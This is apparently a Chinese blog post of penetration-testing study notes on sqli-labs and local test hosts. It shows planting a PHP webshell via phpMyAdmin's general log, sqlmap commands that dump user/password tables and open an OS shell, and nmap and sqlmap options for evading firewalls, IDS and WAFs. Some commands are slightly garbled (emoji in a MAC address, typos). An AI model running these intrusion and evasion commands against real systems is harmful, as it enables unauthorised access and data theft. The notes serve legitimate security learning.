{"title":"渗透测试笔记 - day14 getshell和自动化注入","date":"2023-03-16T17:42:18.098Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day14 getshell和自动化注入","updated":"2023-03-17T04:58:24.338Z","content":"<h2 id=\"日志getshell\">日志getshell<a title=\"#日志getshell\" href=\"#日志getshell\"></a></h2>\n<h3 id=\"phpmyadmin使用日志文件连接建立后门并getshell。\">phpmyadmin使用日志文件连接建立后门并getshell。<a title=\"#phpmyadmin使用日志文件连接建立后门并getshell。\" href=\"#phpmyadmin使用日志文件连接建立后门并getshell。\"></a></h3>\n<p>设置general log为ON，Gereranl log file路径文件为后门文件。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926263.png\" alt=\"image-20220212230416180\" loading=\"lazy\" class=\"φbp\"></p>\n<p>写入一句话木马。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926424.png\" alt=\"image-20220212231133671\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用蚁剑连接。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926589.png\" alt=\"image-20220212231201133\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926737.png\" alt=\"image-20220212231224719\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"sqlmap\">sqlmap<a title=\"#sqlmap\" href=\"#sqlmap\"></a></h2>\n<p>sql注入自动化工具。</p>\n<h3 id=\"get注入\">get注入<a title=\"#get注入\" href=\"#get注入\"></a></h3>\n<h4 id=\"sqli-lab-less-1:\">sqli-lab less-1:<a title=\"#sqli-lab-less-1:\" href=\"#sqli-lab-less-1:\"></a></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u url<span class=\"comment\"># -u url选项</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926606.png\" alt=\"image-20220212105605705\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.p -u url --batch --current-db<span class=\"comment\"># --batch 不需要用户输入，使用默认选项 --curren-db 查找当前数据库信息</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926102.png\" alt=\"image-20220212105315039\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u url --batch --dbs<span class=\"comment\"># --dbs 查找所有数据库名</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926150.png\" alt=\"image-20220212105711326\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u url --batch -D security --tables<span class=\"comment\"># -D 指定数据库，可通过逗号拼接多个库 --tables 查找所有表名</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926325.png\" alt=\"image-20220212110054387\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u url --batch -D security -T <span class=\"built_in\">users</span> --columns<span class=\"comment\"># -T 指定表名，可通过逗号拼接多个表 --columns 查找字段名</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926520.png\" alt=\"image-20220212110301413\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u url --batch -D security -T <span class=\"built_in\">users</span> -C username,password --dump<span class=\"comment\"># -C 指定字段名，可通过逗号拼接多个字段 --dump 打印整个表的信息</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926017.png\" alt=\"image-20220212110706644\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u url --batch -D security -T <span class=\"built_in\">users</span> -C username,password --dump --fresh-queries<span class=\"comment\"># -C 指定字段名，可通过逗号拼接多个字段 --dump 打印 --fresh-queries 刷新本地缓存</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"post注入\">post注入<a title=\"#post注入\" href=\"#post注入\"></a></h3>\n<h4 id=\"sqli-lab-less-11:\">sqli-lab less-11:<a title=\"#sqli-lab-less-11:\" href=\"#sqli-lab-less-11:\"></a></h4>\n<p>​\t抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112146954.png\" alt=\"image-20220212140519376\" loading=\"lazy\" class=\"φbp\"></p>\n<p>保存包文为文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926442.png\" alt=\"image-20220212140859793\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r C:\\Users\\Administrator\\Desktop\\les --batch --dbs <span class=\"comment\"># -r 选取文件路径</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926944.png\" alt=\"image-20220212140935897\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926301.png\" alt=\"image-20220212140948348\" loading=\"lazy\" class=\"φbp\"></p>\n<p>或</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u <span class=\"string\">&quot;http://127.0.0.1:7791/Less-11/&quot;</span> --data <span class=\"string\">&quot;uname=admin&amp;passwd=admin&amp;Submit&quot;</span> --batch --current-user <span class=\"comment\"># --data post传输的数据</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926426.png\" alt=\"image-20220212141831120\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"cookie注入\">cookie注入<a title=\"#cookie注入\" href=\"#cookie注入\"></a></h3>\n<h4 id=\"sqli-lab-less-20\">sqli-lab less-20<a title=\"#sqli-lab-less-20\" href=\"#sqli-lab-less-20\"></a></h4>\n<p>抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926534.png\" alt=\"image-20220212142525778\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u <span class=\"string\">&quot;http://127.0.0.1:7791/Less-20/index.php&quot;</span> --cookie <span class=\"string\">&quot; uname=admin; pma_lang=zh_CN; pmaUser-1=%7B%22iv%22%3A%22EnZiCH6hbTLLGWiJaKiv8w%3D%3D%22%2C%22mac%22%3A%22f3035f12f6c6b339e05e228245bfee47bedc5b20%22%2C%22payload%22%3A%22NXF9rWh5MJUShZ7TmP6Aew%3D%3D%22%7D; pma_theme=metro&quot;</span> --batch --dbs --level 2 <span class=\"comment\"># --cookie cookie注入选项 --level 选择注入强度，注入强度可为1，2，3，4，为2时检查cookie，1时则不检查</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926899.png\" alt=\"image-20220212143040318\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926066.png\" alt=\"image-20220212143049747\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"refer注入\">refer注入<a title=\"#refer注入\" href=\"#refer注入\"></a></h3>\n<h4 id=\"sqli-lab-less-20-1\">sqli-lab less-20<a title=\"#sqli-lab-less-20-1\" href=\"#sqli-lab-less-20-1\"></a></h4>\n<p>抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926091.png\" alt=\"image-20220212145931552\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u <span class=\"string\">&quot;http://127.0.0.1:7791/Less-19&quot;</span> --refer <span class=\"string\">&quot; http://127.0.0.1:7791/Less-19/&quot;</span> --batch --dbs --level 3 <span class=\"comment\"># --refer 指定refer内容 --level 注入强度为3时检查User-Agent和refer</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926789.png\" alt=\"image-20220212151125771\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"其他参数详解\">其他参数详解<a title=\"#其他参数详解\" href=\"#其他参数详解\"></a></h3>\n<p>–is-dba 检查网站的权限是否为管理员权限</p>\n<p>–level 1-4 （测试深度等级，等级越高，检查项越多，&gt;=2时检查cookie，&gt;=3时检查referer和User-Agent）</p>\n<p>–risk 1-4（测试风险等级，等级越高，payload越复杂）</p>\n<p>–foece-ssl（使用ssl证书测试https网站的注入）</p>\n<p>-m （从本地文件里指定多个链接测试）</p>\n<p>–random-agent（指定随机的User-Agent头）</p>\n<p>–threads 20 (设置线程为20)</p>\n<h3 id=\"google-hack语法批量注入\">Google Hack语法批量注入<a title=\"#google-hack语法批量注入\" href=\"#google-hack语法批量注入\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926825.png\" alt=\"image-20220212155658434\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926575.png\" alt=\"image-20220212155644312\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"--os-shell\">–os-shell<a title=\"#--os-shell\" href=\"#--os-shell\"></a></h3>\n<p>利用条件：</p>\n<ul>\n<li>具有写权限</li>\n<li>关闭转义功能</li>\n<li>知道绝对路径</li>\n</ul>\n<p>利用步骤：</p>\n<ul>\n<li>选择语言环境。如【4】PHP</li>\n<li>指定网站绝对路径。如【2】custom location（s）</li>\n<li>输入网站写入的绝对路径。</li>\n</ul>\n<h4 id=\"sqli-lab-less-1\">sqli-lab less-1<a title=\"#sqli-lab-less-1\" href=\"#sqli-lab-less-1\"></a></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -u <span class=\"string\">&quot;http://127.0.0.1:7791/Less-1/?id=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926407.png\" alt=\"image-20220212162439062\" loading=\"lazy\" class=\"φbp\"></p>\n<p>选择PHP环境，输入绝对路径。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926929.png\" alt=\"image-20220212162509901\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111926915.png\" alt=\"image-20220212162534915\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111927015.png\" alt=\"image-20220212220559427\" loading=\"lazy\" class=\"φbp\"></p>\n<p>返回成功。</p>\n<h2 id=\"nmap伪静态注入\">nmap伪静态注入<a title=\"#nmap伪静态注入\" href=\"#nmap伪静态注入\"></a></h2>\n<p>查看页面最后生成时间。</p>\n<p>javascript:alert(document.laseModified)</p>\n<p>参数可以做算术运算</p>\n<p>sqlmap跑伪静态注入，在注入点后加 <em>，如url/id/1</em>/page/1</p>\n<h2 id=\"nmap绕waf\">nmap绕waf<a title=\"#nmap绕waf\" href=\"#nmap绕waf\"></a></h2>\n<p>碎片扫描<br>\nNmap发送8个字节的数据包绕过防火墙/IDS/IPS。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -f 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>使用16字节的数据包,我们可以指定自定义数据包大小为8的倍数。<br>\nNmap --mtu 16 192.168.1.1</p>\n<p>诱饵扫描<br>\n目标由多个假冒或伪造IP地址进行扫描。这样防火墙就会认为攻击或扫描是通过多个资源或IP地址进行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap –D RND:10 192.168.1.1</span><br><span class=\"line\">nmap –D decoy1,decoy2,decoy3(诱饵主机) 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>空闲扫描<br>\n在这种技术中会隐藏攻击者的IP地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Nmap –P0 -sI zombie(僵尸) 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>随机数据长度</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap --data-length 25 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>参数选项–source-port</p>\n<p>利用防火墙的弱点。端口21（FTP），端口53（DNS）和67（DHCP）是这种扫描类型的常见端口。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Nmap --source-port 21 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>欺骗扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap --sT -PN --spoof-mac aa🇧🇧cc:dd🇪🇪ff  192.168.1.1</span><br><span class=\"line\">nmap --badsum 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>随机顺序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap --randomize-hosts 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>加入tamper脚本进行自动waf绕过：</p>\n<p>​\t--tamper=space2hash，space2mysqldash</p>\n","prev":{"title":"渗透测试笔记 - day18、19 XSS基础 ","link":"2023/03/16/渗透测试笔记 - day18、19 XSS基础 "},"next":{"title":"渗透测试笔记 - day13 其他注入技巧","link":"2023/03/16/渗透测试笔记 - day13 其他注入技巧"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day14 getshell和自动化注入/","toc":[{"id":"日志getshell","title":"日志getshell","index":"1","children":[{"id":"phpmyadmin使用日志文件连接建立后门并getshell。","title":"phpmyadmin使用日志文件连接建立后门并getshell。","index":"1.1"}]},{"id":"sqlmap","title":"sqlmap","index":"2","children":[{"id":"get注入","title":"get注入","index":"2.1"},{"id":"post注入","title":"post注入","index":"2.2"},{"id":"cookie注入","title":"cookie注入","index":"2.3"},{"id":"refer注入","title":"refer注入","index":"2.4"},{"id":"其他参数详解","title":"其他参数详解","index":"2.5"},{"id":"google-hack语法批量注入","title":"Google Hack语法批量注入","index":"2.6"},{"id":"--os-shell","title":"–os-shell","index":"2.7"}]},{"id":"nmap伪静态注入","title":"nmap伪静态注入","index":"3"},{"id":"nmap绕waf","title":"nmap绕waf","index":"4"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day14 getshell和自动化注入/\" title=\"渗透测试笔记 - day14 getshell和自动化注入\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day14 getshell和自动化注入/</a>"},"reading_time":"1320 words in 9 min"}